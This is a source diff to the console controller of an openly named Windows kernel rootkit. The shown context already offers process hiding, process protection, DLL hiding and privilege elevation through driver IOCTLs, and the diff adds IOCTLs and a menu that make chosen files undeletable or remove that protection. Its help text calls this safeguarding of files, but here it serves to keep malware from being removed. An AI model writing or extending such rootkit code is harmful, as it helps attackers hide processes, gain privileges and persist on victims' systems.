@@ -25,10 +25,17 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG UnProtectProcessOP =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG ProtectFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x704, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG UnProtectFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x705, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG DisableProtectionToAll =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x706, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
         WCHAR DLLName[256];
+        WCHAR Path[MAX_PATH];
     };
 
 
@@ -111,6 +118,59 @@ namespace Rootkit {
         );
     }
 
+    bool ProtectFile(HANDLE driver_handle, WCHAR* Path) {
+        Request req = {};
+        DWORD ret = 0;
+
+        // Safe copy
+        wcsncpy_s(req.Path, _countof(req.Path), Path, _TRUNCATE);
+
+        // Send only input (no output buffer)
+        return DeviceIoControl(
+            driver_handle,
+            Rootkit::codes::ProtectFile,
+            &req,
+            sizeof(req),
+            nullptr,        // <-- no output buffer
+            0,              // <-- size 0
+            &ret,
+            nullptr
+        );
+    }
+
+    bool UnProtectFile(HANDLE driver_handle, WCHAR* Path) {
+        Request req = {};
+        DWORD ret = 0;
+
+        // Safe copy
+        wcsncpy_s(req.Path, _countof(req.Path), Path, _TRUNCATE);
+
+        // Send only input (no output buffer)
+        return DeviceIoControl(
+            driver_handle,
+            Rootkit::codes::UnProtectFile,
+            &req,
+            sizeof(req),
+            nullptr,        // <-- no output buffer
+            0,              // <-- size 0
+            &ret,
+            nullptr
+        );
+    }
+
+    bool ClearFileProtections(HANDLE driver_handle) {
+        return DeviceIoControl(
+            driver_handle,
+            Rootkit::codes::DisableProtectionToAll,
+            nullptr,
+            NULL,
+            nullptr,
+            NULL,
+            nullptr,
+            nullptr
+        );
+    }
+
     bool ElevateProcess(HANDLE driver_handle, DWORD pid) {
         Request r;
         r.process_id = ULongToHandle(pid);
@@ -173,6 +233,7 @@ void showMenu() {
     std::cout << "3. Hide Process\n";
     std::cout << "4. Protect Process\n";
     std::cout << "5. Hide DLL from process.\n";
+    std::cout << "6. File Protection Menu\n";
     std::cout << "99. Exit\n";
     std::cout << "Current PID: " << pid << std::endl;
     if (!g_MsgFromKernel.empty() && g_MsgFromKernel[0] != '\0') {
@@ -239,9 +300,12 @@ int main() {
     int pidProtect;
     int pidDLLHide;
     int choiceProtect;
+    int choiceFileProtect;
     bool enabled = true;
     WCHAR DLLName[256];
+    WCHAR Path[MAX_PATH];
     std::wstring tempDLLName;
+    WCHAR FilePath[MAX_PATH];
 
     while (true) {
         showMenu();
@@ -426,6 +490,88 @@ int main() {
             }
             Sleep(5000);
             system("cls");
+            break;
+        }
+        case 6: { // File Protection Menu
+            bool fileMenuEnabled = true;
+            while (fileMenuEnabled) {
+                system("cls");
+                std::cout << "=== File Protection Menu ===\n";
+                std::cout << "1) Enable File Protection (Prevents Deletion)\n";
+                std::cout << "2) Disable File Protection (Allows Deletion)\n";
+                std::cout << "3) Clear All File Protections\n";
+                std::cout << "    Enter '99' for a detailed explanation\n";
+                std::cout << "4) Return to Main Menu\n";
+                std::cout << "===========================\n";
+                std::cout << "Enter a choice: ";
+                std::cin >> choiceFileProtect;
+
+                switch (choiceFileProtect) {
+                case 1:
+                    std::wcin.ignore();
+                    std::wcout << L"Enter a full file path to protect (e.g., C:\\Users\\User\\Desktop\\File.txt): ";
+                    std::wcin.getline(FilePath, MAX_PATH);
+                    std::wcout << L"[!] Sending Message to Driver.\n";
+                    Rootkit::ProtectFile(driver_handle, FilePath);
+                    std::cout << "[+] Waiting for message from kernel...\n";
+                    WaitForSingleObject(hEvent, 10000);
+                    if (pView && ((char*)pView)[0] != '\0') {
+                        printf("[+] Message From Kernel: %s\n", (char*)pView);
+                        g_MsgFromKernel = std::string((char*)pView);
+                    } else {
+                        printf("No message has been received from the kernel...\n");
+                    }
+                    Sleep(5000);
+                    break;
+                case 2:
+                    std::wcin.ignore();
+                    std::wcout << L"Enter a full file path to unprotect (e.g., C:\\Users\\User\\Desktop\\File.txt): ";
+                    std::wcin.getline(FilePath, MAX_PATH);
+                    std::wcout << L"[!] Sending Message to Driver.\n";
+                    Rootkit::UnProtectFile(driver_handle, FilePath);
+                    std::cout << "[+] Waiting for message from kernel...\n";
+                    WaitForSingleObject(hEvent, 10000);
+                    if (pView && ((char*)pView)[0] != '\0') {
+                        printf("[+] Message From Kernel: %s\n", (char*)pView);
+                        g_MsgFromKernel = std::string((char*)pView);
+                    } else {
+                        printf("No message has been received from the kernel...\n");
+                    }
+                    Sleep(5000);
+                    break;
+                case 3:
+                    std::cout << "[!] Sending request to clear all file protections.\n";
+                    Rootkit::ClearFileProtections(driver_handle);
+                    std::cout << "[+] Waiting for message from kernel...\n";
+                    WaitForSingleObject(hEvent, 10000);
+                    if (pView && ((char*)pView)[0] != '\0') {
+                        printf("[+] Message From Kernel: %s\n", (char*)pView);
+                        g_MsgFromKernel = std::string((char*)pView);
+                    } else {
+                        printf("No message has been received from the kernel...\n");
+                    }
+                    Sleep(5000);
+                    break;
+                case 99:
+                    system("cls");
+                    std::cout << "File Protection Explanation:\n";
+                    std::cout << "1) Enable File Protection: Prevents the specified file from being deleted or modified by unauthorized processes.\n";
+                    std::cout << "2) Disable File Protection: Removes protection, allowing the file to be deleted or modified.\n";
+                    std::cout << "3) Clear All File Protections: Removes protection from all files previously protected by the driver.\n";
+                    std::cout << "This feature is useful for safeguarding critical files from tampering or accidental deletion.\n\n";
+                    std::cout << "Returning to the file protection menu in 10 seconds...\n";
+                    Sleep(10000);
+                    break;
+                case 4:
+                    system("cls");
+                    fileMenuEnabled = false;
+                    break;
+                default:
+                    std::cout << "Invalid Choice. Please try again.\n";
+                    Sleep(2000);
+                    break;
+                }
+            }
             break;
         }
         case 99: {
